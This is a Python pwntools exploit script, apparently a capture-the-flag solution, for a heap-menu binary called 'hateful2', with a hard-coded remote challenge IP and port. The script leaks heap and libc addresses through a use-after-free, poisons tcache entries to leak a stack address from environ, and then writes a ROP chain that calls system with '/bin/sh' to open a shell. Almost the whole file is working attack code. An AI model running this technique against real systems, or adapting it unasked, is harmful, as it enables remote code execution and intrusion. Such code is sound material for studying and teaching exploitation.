from pwn import *
from icecream import ic

elf = exe = ELF("./hateful2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("52.59.124.14", 5022)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def add(idx, size, cont):
    sla(b'>> ',b'1')
    sla(b'Index:',str(idx).encode())
    sla(b'Size:',str(size).encode())
    sa(b'>> ',cont)
    info(f"ADDED {idx}:{size}")

def edit(idx, cont):
    sla(b'>> ',b'2')
    sla(b'Index:',str(idx).encode())
    sla(b'>> ',cont)
    info(f"EDITED {idx}")

def view(idx):
    sla(b'>> ',b'3')
    sla(b'Index:',str(idx).encode())
    ru(b'Message: ')
    # return rl()

def rem(idx):
    sla(b'>> ',b'4')
    sla(b'Index:',str(idx).encode())
    info(f"DELETED {idx}")
'''
add(0,0xf8,b'AAAAAAAA')
rem(0)
leak = u64(view(0).strip().ljust(8,b'\0')) << 12
info(f"HEAP: {hex(leak)}")

for i in range(9):
    add(i,0xf8,b'AAAAAAA')
for i in range(9):
    rem(i)

add(0,0x5f8,b'AAAAAAAA')
leak = view(0).strip()
leak = b'\x0a'+re(6).rstrip()
leak = u64(leak.ljust(8,b'\0')) - libc.sym['__libc_start_main'] + 0x36
info(f"LEAK: {hex(leak)}")
'''
add(0,0xf8,b'AAAAAAAA')
rem(0)
view(0)
heap = uu64(5) << 12
ic(hex(heap))


add(0, 0x78, b"bruh")
add(2, 0x518, b"bruh")
add(1, 0x78, b"bruh")

rem(2)
view(2)
libc.address = uu64(6) - 0x1d2cc0
ic(hex(libc.address))

add(3, 0x80, b"bruh")
add(4, 0x80, b"bruh")


rem(3)
rem(4)
edit(4, p64((libc.sym['environ'] - 7 - 8) ^ (heap-0x4b0) >> 12))

add(5, 0x80, b"bruh")
add(6, 0x80, b"bruhaaaaaaaaaaax")
view(6)
ru("x")
stack = uu64(6) - 0x120

rem(0)
rem(1)
edit(1, p64((stack - 7) ^ (heap-0x940) >> 12))

payload = b'a'*8
payload += p64(gad(libc, ['ret']))
payload += p64(qgad(libc, "rdi"))
payload += p64(binsh(libc))
payload += p64(libc.sym.system)
add(7, 0x78, b"bruh")
add(8, 0x78, payload)


io.interactive()
